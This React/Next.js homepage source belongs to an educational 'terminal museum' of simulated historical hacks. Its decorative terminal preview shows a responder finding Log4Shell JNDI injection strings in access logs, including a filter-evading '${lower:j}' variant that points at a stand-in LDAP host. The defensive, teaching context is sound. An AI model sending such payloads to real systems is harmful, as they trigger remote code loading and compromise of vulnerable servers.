import Link from "next/link";
import type { ReactNode } from "react";
import { DirectionalTransition } from "@/components/directional-transition";
import {
  Archive,
  ArrowRight,
  CircleDot,
  ShieldCheck,
} from "lucide-react";
import { SiteFooter, SiteHeader } from "@/components/site-header";
import { ExhibitRow } from "@/components/exhibit-row";
import { InkLink } from "@/components/ink-button";
import { BinaryRain } from "@/components/binary-rain";
import { scenarios, scenariosNewestFirst } from "@/lib/scenarios";

export default function Home() {
  const featured = scenariosNewestFirst.slice(0, 3);
  const latestSlug = scenariosNewestFirst[0].slug;
  return (
    <DirectionalTransition>
      <div className="flex min-h-dvh flex-col">
        <SiteHeader />
        <main className="flex-1">
          <Hero firstSlug={latestSlug} count={scenarios.length} />
          <Catalog
            featured={featured}
            latestSlug={latestSlug}
            total={scenarios.length}
          />
          <HowItWorks />
          <Safety />
        </main>
        <SiteFooter />
      </div>
    </DirectionalTransition>
  );
}

function Hero({ firstSlug, count }: { firstSlug: string; count: number }) {
  return (
    <section className="relative overflow-hidden border-b border-rule">
      {/* Binary rainfall — purely decorative, behind all content */}
      <BinaryRain className="pointer-events-none absolute inset-0 h-full w-full opacity-30" />
      <div className="relative mx-auto max-w-6xl px-6 py-20 sm:py-28">
        <div className="grid gap-16 lg:grid-cols-[1fr_480px] lg:items-center lg:gap-12">
          {/* Left: headline + CTA */}
          <div>
            <div className="flex items-center gap-3 eh-eyebrow">
              <span className="inline-flex items-center gap-1.5 text-ink">
                <CircleDot className="size-3 eh-rec-dot" aria-hidden />
                Now exhibiting
              </span>
              <span className="text-text-4">/</span>
              <span>{String(count).padStart(2, "0")} reconstructions</span>
            </div>

            <h1 className="mt-6 font-serif text-[52px] leading-none text-balance text-text-1 sm:text-[72px] lg:text-[80px]">
              Replay hacker history{" "}
              <span className="italic text-ink">in your browser.</span>
            </h1>

            <p className="mt-6 max-w-lg text-pretty text-[14px] leading-[1.7] text-text-3">
              A playable terminal museum for the hacks, incidents, and
              command-line moments that shaped computing. Every system is a
              simulation. You sit at the prompt the way the people who lived
              through it did, and type your way through.
            </p>

            <div className="mt-9 flex flex-wrap items-center gap-3">
              <InkLink href={`/scenarios/${firstSlug}`} variant="primary" transitionTypes={["nav-forward"]}>
                Start a simulation
              </InkLink>
              <InkLink href="/scenarios" variant="secondary" showArrow={false} transitionTypes={["nav-forward"]}>
                <Archive className="size-3.5" aria-hidden />
                Explore the archive
              </InkLink>
            </div>
          </div>

          {/* Right: decorative terminal preview */}
          <div className="hidden lg:block">
            <TerminalPreview />
          </div>
        </div>
      </div>
    </section>
  );
}

function TerminalPreview() {
  return (
    <div className="eh-crt-frame relative overflow-hidden rounded-sm">
      <span className="eh-screw absolute left-2 top-2" aria-hidden />
      <span className="eh-screw absolute right-2 top-2" aria-hidden />
      {/* Strip */}
      <div className="eh-crt-strip flex items-center justify-between px-4 py-2.5 eh-eyebrow text-text-3">
        <span className="text-ink">EXH-020</span>
        <span className="inline-flex items-center gap-1.5">
          <CircleDot className="size-2.5 eh-rec-dot text-ink" aria-hidden />
          <span>live session</span>
        </span>
      </div>
      {/* Terminal body */}
      <div className="bg-background p-5 font-mono text-[12px] leading-[1.7]">
        <TermLine prompt user="responder" host="prod-java-trace" path="/srv/payments-api">
          cat access.log | grep &apos;jndi&apos;
        </TermLine>
        <TermLine out dim>2021-12-10 06:14:31 [WARN] Header: User-Agent:</TermLine>
        <TermLine out amber>{"${jndi:ldap://198.51.100.9:1389/a}"}</TermLine>
        <TermLine out dim>2021-12-10 06:14:44 [WARN] Header: X-Forwarded-For:</TermLine>
        <TermLine out amber>{"${jndi:ldap://198.51.100.9:1389/b}"}</TermLine>
        <TermLine out dim>2021-12-10 06:15:02 [WARN] Header: X-Api-Version:</TermLine>
        <TermLine out amber>{"${${lower:j}ndi:ldap://198.51.100.9:1389/c}"}</TermLine>
        <div className="my-2 border-t border-rule" />
        <TermLine prompt user="responder" host="prod-java-trace" path="/srv/payments-api">
          grep -r &apos;log4j-core&apos; pom.xml
        </TermLine>
        <TermLine out>
          &nbsp;&nbsp;&lt;artifactId&gt;<span className="text-ink">log4j-core</span>&lt;/artifactId&gt;
        </TermLine>
        <TermLine out>
          &nbsp;&nbsp;&lt;version&gt;<span className="text-ink">2.14.0</span>&lt;/version&gt;
        </TermLine>
        <div className="my-2 border-t border-rule" />
        <TermLine prompt user="responder" host="prod-java-trace" path="/srv/payments-api">
          <span className="text-text-3 italic"># CVE-2021-44228 — confirmed vulnerable</span>
        </TermLine>
        <TermLine prompt user="responder" host="prod-java-trace" path="/srv/payments-api">
          <span className="inline-block h-[1em] w-[0.55em] animate-pulse bg-ink align-middle" aria-hidden />
        </TermLine>
      </div>
    </div>
  );
}

function TermLine({
  prompt,
  out,
  dim,
  amber,
  user,
  host,
  path,
  children,
}: {
  prompt?: boolean;
  out?: boolean;
  dim?: boolean;
  amber?: boolean;
  user?: string;
  host?: string;
  path?: string;
  children?: ReactNode;
}) {
  if (prompt) {
    return (
      <div className="flex items-baseline gap-0">
        <span className="shrink-0 text-text-4">
          {user}@{host}
          <span className="text-text-4">:</span>
          <span className="text-ink">{path}</span>
          <span className="text-text-2">$</span>
          {" "}
        </span>
        <span className="text-text-1">{children}</span>
      </div>
    );
  }
  return (
    <div
      className={
        amber
          ? "text-ink pl-2"
          : dim
            ? "text-text-4 pl-2"
            : "text-text-2 pl-2"
      }
    >
      {children}
    </div>
  );
}

function Catalog({
  featured,
  latestSlug,
  total,
}: {
  featured: typeof scenarios;
  latestSlug: string;
  total: number;
}) {
  return (
    <section className="border-b border-rule">
      <div className="mx-auto max-w-6xl px-6 py-20">
        <header className="mb-2 flex items-end justify-between gap-6 border-b border-rule pb-8">
          <div>
            <div className="eh-eyebrow">Latest acquisitions</div>
            <h2 className="mt-2 font-serif text-[36px] leading-tight text-text-1">
              Three new exhibits.
            </h2>
            <p className="mt-2 max-w-md text-pretty text-[13px] leading-[1.65] text-text-3">
              The newest reconstructions in the archive. Open one to read the
              briefing first.
            </p>
          </div>
          <Link
            href="/scenarios"
            transitionTypes={["nav-forward"]}
            className="group inline-flex items-center gap-2 text-[13px] text-text-2 hover:text-text-1"
          >
            <span className="eh-link">Browse all {total}</span>
            <ArrowRight
              className="size-3.5 text-text-4 transition-transform duration-200 ease-out group-hover:translate-x-0.5 group-hover:text-text-1"
              aria-hidden
            />
          </Link>
        </header>
        <div>
          {featured.map((s) => (
            <ExhibitRow
              key={s.slug}
              scenario={s}
              isLatest={s.slug === latestSlug}
            />
          ))}
        </div>
      </div>
    </section>
  );
}

function HowItWorks() {
  const steps = [
    {
      n: "01",
      t: "Pick an exhibit",
      d: "Each scenario is a self-contained reconstruction with a briefing, a fake system, and a defensive lesson.",
    },
    {
      n: "02",
      t: "Type through the story",
      d: "A real terminal renders in your browser via wterm. Commands are scripted; outputs feel real because they were written that way.",
    },
    {
      n: "03",
      t: "Read the debrief",
      d: "Every reconstruction ends with what happened, what was simulated, and what to take back to the systems you actually own.",
    },
  ];
  return (
    <section className="border-b border-rule">
      <div className="mx-auto max-w-6xl px-6 py-20">
        <div className="eh-eyebrow">How it works</div>
        <h2 className="mt-2 font-serif text-[36px] leading-tight text-text-1">
          A museum that you can type inside.
        </h2>
        <ol className="mt-12 grid border border-rule sm:grid-cols-3 sm:divide-x sm:divide-rule">
          {steps.map((s, i) => (
            <li
              key={s.n}
              className={`p-8 ${i < steps.length - 1 ? "border-b border-rule sm:border-b-0" : ""}`}
            >
              <div className="flex items-baseline gap-3">
                <span className="font-serif text-[28px] leading-none text-ink tabular-nums">
                  {s.n}
                </span>
                <span className="eh-eyebrow">step</span>
              </div>
              <h3 className="mt-5 font-serif text-[22px] leading-tight text-text-1">
                {s.t}
              </h3>
              <p className="mt-2 text-pretty text-[13px] leading-relaxed text-text-3">
                {s.d}
              </p>
            </li>
          ))}
        </ol>
      </div>
    </section>
  );
}

function Safety() {
  return (
    <section>
      <div className="mx-auto max-w-6xl px-6 py-20">
        <div className="grid gap-10 sm:grid-cols-12">
          <div className="sm:col-span-4">
            <div className="flex items-center gap-2 eh-eyebrow">
              <ShieldCheck className="size-3 text-ink" aria-hidden />
              Safety
            </div>
            <h2 className="mt-2 font-serif text-[30px] leading-tight text-text-1 text-balance">
              No real systems are touched.
            </h2>
          </div>
          <div className="sm:col-span-8">
            <p className="text-pretty text-[14px] leading-relaxed text-text-2">
              Every environment is fictional, sandboxed, or historically
              abstracted. Commands are matched against scripted responses. The
              filesystem you see exists only inside your tab. Network commands
              return a polite refusal. There are no real credentials, no real
              hosts, no exploit code: only the shape of the story, told in the
              medium it actually happened in.
            </p>
            <p className="mt-4 text-[13px] leading-relaxed text-text-3">
              EmulateHacks exists to teach how incidents look from the inside,
              so the next one is recognised earlier. Read the{" "}
              <Link href="/about" transitionTypes={["nav-forward"]} className="eh-link text-text-1">
                full safety note
              </Link>
              .
            </p>
          </div>
        </div>
      </div>
    </section>
  );
}
